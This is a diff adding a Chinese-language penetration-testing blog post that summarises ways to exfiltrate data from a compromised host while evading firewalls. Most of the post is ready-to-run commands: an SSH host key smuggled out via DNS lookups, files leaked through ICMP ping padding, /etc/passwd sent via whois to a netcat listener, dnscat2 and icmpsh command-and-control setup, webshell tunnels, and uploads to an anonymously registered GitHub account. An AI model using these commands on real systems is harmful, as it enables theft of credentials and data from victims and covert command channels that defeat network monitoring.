@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="chrome=1">
+  
+  <title>
+    数据回传通道总结 | Leticia‘s Blog 
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+  <meta name="author" content="麻薯">
+
+
+
+  <meta name="keywords" content=",数据回传">
+<meta name="description" content="前言攻陷目标主机之后并不意味着就不用再和防火墙斗智斗勇，数据回传的过程仍然有可能被防火墙发现和阻止，所以我们要根据实际情况选择更隐秘的方式传出文件。本文总结了常用的数据传出方式，将持续更新。
+应用协议利用http.server回传123456python2：python -m SimpleHTTPServerpython3:python -m http.serverphp:php -S 0.0.0">
+<meta property="og:type" content="article">
+<meta property="og:title" content="数据回传通道总结 | Leticia‘s Blog">
+<meta property="og:url" content="http://yoursite.com/2021/01/04/数据回传通道总结/index.html">
+<meta property="og:site_name" content="Leticia‘s Blog">
+<meta property="og:description" content="前言攻陷目标主机之后并不意味着就不用再和防火墙斗智斗勇，数据回传的过程仍然有可能被防火墙发现和阻止，所以我们要根据实际情况选择更隐秘的方式传出文件。本文总结了常用的数据传出方式，将持续更新。
+应用协议利用http.server回传123456python2：python -m SimpleHTTPServerpython3:python -m http.serverphp:php -S 0.0.0">
+<meta property="og:updated_time" content="2021-01-10T10:27:42.873Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="数据回传通道总结 | Leticia‘s Blog">
+<meta name="twitter:description" content="前言攻陷目标主机之后并不意味着就不用再和防火墙斗智斗勇，数据回传的过程仍然有可能被防火墙发现和阻止，所以我们要根据实际情况选择更隐秘的方式传出文件。本文总结了常用的数据传出方式，将持续更新。
+应用协议利用http.server回传123456python2：python -m SimpleHTTPServerpython3:python -m http.serverphp:php -S 0.0.0">
+
+  <!-- favicon icon files -->
+
+  <link rel="icon" type="image/x-icon" href="/images/favicon.ico">
+  <link rel="icon" href="/images/favicon.ico">
+
+  <!-- css files -->
+  <link rel="stylesheet" href="/css/font-awesome.min.css">
+  <link rel="stylesheet" href="/css/uno.css">
+  <link rel="stylesheet" href="/css/tagscloud.css">
+  <link rel="stylesheet" href="/css/links.css">
+  <link rel="stylesheet" href="/css/archive.css">
+  <link rel="stylesheet" href="/css/jquery.fancybox.css">
+  <link href="//cdn.bootcss.com/highlight.js/9.8.0/styles/monokai-sublime.min.css" rel="stylesheet">
+  <script src="//cdn.bootcss.com/highlight.js/9.2.0/highlight.min.js"></script>
+</head>
+<body>
+  <!-- mobile menu -->
+  <span class="mobile btn-mobile-menu">
+    <i class="fa btn-mobile-menu__icon fa-bars" aria-hidden="true"></i>
+  </span>
+  <!-- side panel -->
+  
+  <header class="panel-cover panel-cover--collapsed">
+
+  <div class="panel-main">
+    <div class="panel-main__inner panel-inverted">
+      <div class="panel-main__content">
+      
+        <a href="/" title="link to homepage for Leticia‘s Blog"><img src="/images/avatar.jpg" width="80" alt="Leticia‘s Blog logo" class="panel-cover__logo logo" /></a>
+      
+        <h1 class="panel-cover__title panel-title"><a href="/" title="link to homepage">麻薯</a></h1>
+        <hr class="panel-cover__divider" />
+        
+        <p class="panel-cover__description">
+          She will never see the day it blossoms,maybe.
+        </p>
+        <hr class="panel-cover__divider" />
+        
+        <!-- TagsCloud -->
+        
+
+  <div id="tagscloud">
+<a href="/tags/渗透测试/" class="tagc1">渗透测试 : 47</a><a href="/tags/机器学习/" class="tagc2">机器学习 : 13</a><a href="/tags/笔记/" class="tagc3">笔记 : 13</a><a href="/tags/python/" class="tagc4">python : 12</a><a href="/tags/php/" class="tagc5">php : 10</a><a href="/tags/mysql/" class="tagc1">mysql : 7</a><a href="/tags/网络安全/" class="tagc2">网络安全 : 5</a><a href="/tags/sql注入/" class="tagc3">sql注入 : 5</a><a href="/tags/暴力破解/" class="tagc4">暴力破解 : 5</a><a href="/tags/rop/" class="tagc5">rop : 4</a><a href="/tags/工具配置/" class="tagc1">工具配置 : 3</a><a href="/tags/内网渗透/" class="tagc2">内网渗透 : 3</a><a href="/tags/ctf/" class="tagc3">ctf : 3</a><a href="/tags/文件上传/" class="tagc4">文件上传 : 3</a><a href="/tags/linux/" class="tagc5">linux : 2</a><a href="/tags/XSS/" class="tagc1">XSS : 2</a><a href="/tags/redis/" class="tagc2">redis : 2</a><a href="/tags/metasploit/" class="tagc3">metasploit : 2</a><a href="/tags/逻辑处理漏洞/" class="tagc4">逻辑处理漏洞 : 2</a><a href="/tags/密码学/" class="tagc5">密码学 : 2</a>
+</div>
+
+        <div class="navigation-wrapper">
+          <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+            
+              
+              <li class="navigation__item"><a href="/#blog" title="" class="blog-button">博客</a></li>
+            
+              
+              <li class="navigation__item"><a href="/archive/" title="" class="">归档</a></li>
+            
+              
+              <li class="navigation__item"><a href="/links/" title="" class="">友链</a></li>
+            
+            </ul>
+          </nav>
+          
+<hr class="panel-cover__divider">
+<nav class="cover-navigation navigation--social">
+  <ul class="navigation">
+    
+      <!-- Github -->
+      <li class="navigation__item">
+        <a href="https://github.com/echohun" title="麻薯's GitHub">
+          <i class='fa fa-github'></i>
+          <span class="label">GitHub</span>
+        </a>
+      </li>
+    
+    
+    
+  </ul>
+</nav>
+
+        </div>
+      </div>
+    </div>
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+  <div class="content-wrapper">
+    <div class="content-wrapper__inner entry">
+      <!-- body panel -->
+      
+<article class="post-container post-container--single">
+  <header class="post-header">
+    <h1 class="post-title">数据回传通道总结</h1>
+    
+    <div class="post-meta">
+      <time datetime="2021-01-04 18:15:27" class="post-meta__date date">2021-01-04 18:15:27</time> 
+      <span class="post-meta__tags tags">
+      
+        <font class="categories">&#8226; 分类:
+        <a class="categories-link" href="/categories/渗透测试/">渗透测试</a>
+        </font>
+      
+      
+        &#8226; 标签:
+        <font class="tags">
+        <a class="tags-link" href="/tags/数据回传/">数据回传</a>
+        </font>
+      
+      </span>
+    </div>
+    
+  </header>
+  <section id="post-content" class="article-content post">
+  <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>攻陷目标主机之后并不意味着就不用再和防火墙斗智斗勇，数据回传的过程仍然有可能被防火墙发现和阻止，所以我们要根据实际情况选择更隐秘的方式传出文件。本文总结了常用的数据传出方式，将持续更新。</p>
+<h2 id="应用协议"><a href="#应用协议" class="headerlink" title="应用协议"></a>应用协议</h2><p>利用http.server回传<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">python2：</div><div class="line">python -m SimpleHTTPServer</div><div class="line">python3:</div><div class="line">python -m http.server</div><div class="line">php:</div><div class="line">php -S 0.0.0.0:8888</div></pre></td></tr></table></figure></p>
+<p>利用ftp回传<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">service vsftpd start</div><div class="line">访问ip:21</div></pre></td></tr></table></figure></p>
+<p>利用smb回传<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">cd /etc/samba</div><div class="line">vi smb.conf</div><div class="line">文件内添加:</div><div class="line">[share]</div><div class="line">    path =/home/share</div><div class="line">    available = yes</div><div class="line">    browsealbe = yes</div><div class="line">    public= no</div><div class="line">    writable = yes</div><div class="line">cd /home</div><div class="line">mkdir share</div><div class="line">chmod -R 777 share</div><div class="line">useradd share</div><div class="line">smbpasswd -a share</div><div class="line">service smbd restart</div><div class="line">访问\\ip</div></pre></td></tr></table></figure></p>
+<p>利用scp回传<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">scp localfilename root@xx.xx.xx.xx:filename</div></pre></td></tr></table></figure></p>
+<h2 id="DNS隧道"><a href="#DNS隧道" class="headerlink" title="DNS隧道"></a>DNS隧道</h2><p>1.命令行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">for i in $(xxd -p -c 10 ssh_host_ecdsa_key);do sleep 1s &amp;&amp; nslookup $i.xxx.com xx.xx.xx.xx;done</div></pre></td></tr></table></figure></p>
+<p>2.dnscat2、dns2tcp</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">攻击机（server）：</div><div class="line">安装</div><div class="line">apt-get install ruby ruby-dev git make g++ rubygems</div><div class="line">gem update --system</div><div class="line">gem install bundler</div><div class="line">git clone https://github.com/iagox86/dnscat2.git</div><div class="line">cd dnscat2/server</div><div class="line">bundle install</div><div class="line">设置一个NS记录指向自己的子域名，再设置一个A记录指向自己部署server端的服务器地址，运行</div><div class="line">ruby ./dnscat2.rb dns.uuzdaisuki.com --no-cache</div><div class="line"></div><div class="line">受害者（linux）安装</div><div class="line">git clone https://github.com/iagox86/dnscat2.git</div><div class="line">cd dnscat2/client/</div><div class="line">make</div><div class="line">受害者（windows）安装</div><div class="line">https://downloads.skullsecurity.org/dnscat2/ 下载win32.zip的dnascat2后解压</div><div class="line"></div><div class="line">将server中产生的secret复制下来，运行</div><div class="line">./dnscat --dns domain=dns.uuzdaisuki.com --secret=xxxxxxxxxxxxxxxxxxxxx</div><div class="line">session -i 1</div></pre></td></tr></table></figure>
+<p>详情参考：</p>
+<p><a href="http://next.uuzdaisuki.com/2018/08/07/%E5%88%A9%E7%94%A8DNS-Tunnel%E4%BC%A0%E8%BE%93%E6%95%B0%E6%8D%AE/" target="_blank" rel="external">http://next.uuzdaisuki.com/2018/08/07/%E5%88%A9%E7%94%A8DNS-Tunnel%E4%BC%A0%E8%BE%93%E6%95%B0%E6%8D%AE/</a></p>
+<h2 id="ping隧道"><a href="#ping隧道" class="headerlink" title="ping隧道"></a>ping隧道</h2><p>1.命令行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cat a.txt | xxd -p -c 1|xargs -n 1 -I &apos;&#123;&#125;&apos; ping -c 1 -s 56 -p &apos;&#123;&#125;&apos; xx.xx.xx.xx</div></pre></td></tr></table></figure></p>
+<p>2.pingtunnel</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">http://www.cs.uit.no/~daniels/PingTunnel/</div><div class="line">ptunnel -p 192.168.100.232 -lp 8888 -da 192.168.118.131 -dp 3389</div><div class="line">    -p 指定ICMP隧道另一端的IP</div><div class="line">    -lp：指定本地监听的端口</div><div class="line">    -da：指定要转发的目标机器的IP</div><div class="line">    -dp：指定要转发的目标机器的端口</div><div class="line">    -x：指定连接密码</div></pre></td></tr></table></figure>
+<p>3.icmpsh展开cc通道：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">攻击者机器部署icmpsh：</div><div class="line">git clone https://github.com/inquisb/icmpsh.git</div><div class="line">sysctl -w net.ipv4.icmp_echo_ignore_all=1</div><div class="line">cd icmpsh</div><div class="line">syntax: ./icmpsh_m.py &lt;attacker’s-IP&gt; &lt;target-IP&gt;</div><div class="line">./icmpsh_m.py 192.168.1.108 192.168.1.106</div><div class="line">受害者机器：</div><div class="line">syntax: icmpsh.exe -t &lt;Kali IP&gt;</div><div class="line">icmpsh.exe -t 192.168.1.108</div></pre></td></tr></table></figure></p>
+<p>4.icmptunnel<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">受害者主机：</div><div class="line">安装icmptunnel</div><div class="line">git clone https://github.com/jamesbarlow/icmptunnel.git</div><div class="line">cd icmptunnel</div><div class="line">make</div><div class="line">禁用ICMP echo回复</div><div class="line">echo 1 &gt; /proc/sys/net/ipv4/icmp_echo_ignore_all</div><div class="line">服务端模式启动icmptunnel，并且给新的隧道接口分配一个IP地址</div><div class="line">./icmptunnel -s</div><div class="line">Ctrlz</div><div class="line">bg</div><div class="line">/sbin/ifconfig tun0 10.0.0.1 netmask 255.255.255.0</div><div class="line">ifconfig</div><div class="line"></div><div class="line">攻击者主机：</div><div class="line">安装icmptunnel</div><div class="line">git clone https://github.com/jamesbarlow/icmptunnel.git</div><div class="line">cd icmptunnel</div><div class="line">make</div><div class="line">禁用ICMP echo回复</div><div class="line">echo 1 &gt; /proc/sys/net/ipv4/icmp_echo_ignore_all</div><div class="line">运行</div><div class="line">./icmptunnel 192.168.1.108</div><div class="line">ctrl z</div><div class="line">/sbin/ifconfig tun0 10.0.0.2 netmask 255.255.255.0</div></pre></td></tr></table></figure></p>
+<h2 id="http隧道"><a href="#http隧道" class="headerlink" title="http隧道"></a>http隧道</h2><p>1.reGeorg<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">git clone https://github.com/sensepost/reGeorg.git</div><div class="line">pip install urllib3</div><div class="line">将对应页面上传到目标服务器上</div><div class="line">并在本地监听</div><div class="line">python reGeorgSocksProxy.py ‐p 8080 ‐l 192.168.1.5 ‐u </div><div class="line">访问目标</div><div class="line">http://192.168.1.119/tunnel.aspx</div></pre></td></tr></table></figure></p>
+<p>2.ABPTTS<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">安装</div><div class="line">apt-get install python-dev  build-essential libssl-dev libffi-dev  libxml2-dev libxslt1-dev zlib1g-dev python-pip</div><div class="line"> pip install pycrypto</div><div class="line">git clone https://github.com/nccgroup/ABPTTS.git</div><div class="line">cd ABPTTS/</div><div class="line">生成payload</div><div class="line">python abpttsfactory.py ‐o webshell</div><div class="line">传到目标靶机</div><div class="line">端口转发</div><div class="line">python abpttsclient.py ‐c webshell/config.txt ‐u &quot;http://192.168.1.119/abptts.aspx&quot; ‐f 192.168.1.5:33389/192.168.1.119:3389</div><div class="line">让攻击机的33389端口流量转发到3389，通过HTTPS服务</div></pre></td></tr></table></figure></p>
+<h2 id="whois隧道"><a href="#whois隧道" class="headerlink" title="whois隧道"></a>whois隧道</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">失陷机：</div><div class="line">root@kali:~# whois -h x.x.x.x -p 4444 `cat /etc/passwd | base64`</div><div class="line">接受机：</div><div class="line">root@kali:/tmp# nc -l -v -p 4444 | sed &quot;&quot;s/ //g&quot;&quot; | base64 -d</div></pre></td></tr></table></figure>
+<h2 id="社交平台或工具"><a href="#社交平台或工具" class="headerlink" title="社交平台或工具"></a>社交平台或工具</h2><p>利用腾讯qq、微信等工具回传</p>
+<h2 id="代码托管"><a href="#代码托管" class="headerlink" title="代码托管"></a>代码托管</h2><p>利用github回传<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">通过一个匿名邮箱注册github账户，并创建一个空仓库</div><div class="line">mdkir upload</div><div class="line">cd upload</div><div class="line">git config --global user.name “user.name”</div><div class="line">git config --global user.email “user.email”</div><div class="line">git clone https://github.com/xxx/xxx.git</div><div class="line">cp -r file upload</div><div class="line">git add *</div><div class="line">git commit -m &quot;update&quot;</div><div class="line">git push -u origin master</div></pre></td></tr></table></figure></p>
+<h2 id="云储存"><a href="#云储存" class="headerlink" title="云储存"></a>云储存</h2><p>利用百度网盘等网盘类工具回传</p>
+<h2 id="邮件"><a href="#邮件" class="headerlink" title="邮件"></a>邮件</h2><p>利用邮件外发回传</p>
+
+  </section>
+  <div class="copyright">
+    <span>文本标题:</span><a href="/2021/01/04/数据回传通道总结/" target="_blank">数据回传通道总结</a><br />
+    <span>文章作者:</span><a href="/" title="回到主页" target="_blank">麻薯</a><br />
+    <span>发布时间:</span>2021-01-04 18:15:27<br />
+    <span>最后更新:</span>2021-01-10 18:27:42<br />
+    <span>原始链接:</span><a href="http://www.uuzdaisuki.com">www.uuzdaisuki.com</a><br />
+    <span>转载声明:</span><i class="fa fa-creative-commons"></i>转载请保留原文链接及作者。
+  </div>
+</article>
+      <!-- footer panel -->
+      <footer class="footer">
+	<center>
+    <span class="footer__copyright">&copy; 2016-2017. | ❤ <a href="mailto:virink@outlook.com"> Virink </a> | 由<a href="https://hexo.io/">Hexo</a>强力驱动 | 主题<a href="https://github.com/virink/vhuno">vHuno</a></span>
+    <span>本站采用<i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"知识共享 署名-非商业性使用-禁止演绎 4.0 国际 许可协议"</a></span>
+    </center>
+</footer>
+    </div>
+  </div>
+  <!-- js files -->
+  <script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="/js/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/js/main.js"></script>
+  <script src="/js/scale.fix.js"></script>
+  <script src="/js/tagcloud.js"></script>
+  
+  
+	<script src="/js/jquery.fancybox.js"></script>
+	<script type="text/javascript">
+		$(document).ready(function() {
+			$(".fancybox").fancybox({
+	            padding: 0,
+	            helpers: {
+	                overlay: {
+	                  locked: false
+	                }
+	            }
+	        });
+		});
+	</script>
+
+  
+    <script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <script type="text/javascript"> 
+        $(document).ready(function(){
+    MathJax.Hub.Config({ 
+        tex2jax: {inlineMath: [['[latex]','[/latex]'], ['\\(','\\)']]} 
+    });
+});
+    </script>
+
+  <script src="//cdn.bootcss.com/highlight.js/9.8.0/highlight.min.js"></script>
+  <script src="/js/gallery.js"></script>
+  <script>
+  $(document).ready(function(){
+    hljs.initHighlightingOnLoad();
+  });
+  </script>
+  
+  
+<div id="totop" style="position: fixed; bottom: 50px; right: 30px; cursor: pointer; opacity: 1;">
+	<a title="back to top"><img style="width:30px;height:30px;" src="/images/totop.png"></a>
+</div>
+<script>
+    (function($) {
+        var upperLimit = 100;
+        var scrollElem = $('#totop');
+        var scrollSpeed = 500;
+        scrollElem.hide();
+        $(window).scroll(function() {
+            var scrollTop = $(document).scrollTop();
+            if (scrollTop > upperLimit) {
+                $(scrollElem).stop().fadeTo(300, 1); // fade back in
+            } else {
+                $(scrollElem).stop().fadeTo(300, 0); // fade out
+            }
+        });
+        $(scrollElem).click(function() {
+            $('html, body').animate({
+                scrollTop: 0
+            }, scrollSpeed);
+            return false;
+        });
+    })(jQuery);
+    </script>
+
+
+  <!-- Analytics Google -->
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+  ga('create', 'UA-83885261-1', 'auto');
+  ga('send', 'pageview');
+</script>
+  
+    <script src="/js/jquery.githubRepoWidget.min.js"></script>
+
+  <!--kill ie6 -->
+<!--[if IE 6]>
+  <script src="//letskillie6.googlecode.com/svn/trunk/2/zh_CN.js"></script>
+<![endif]-->
+</body>
+</html>
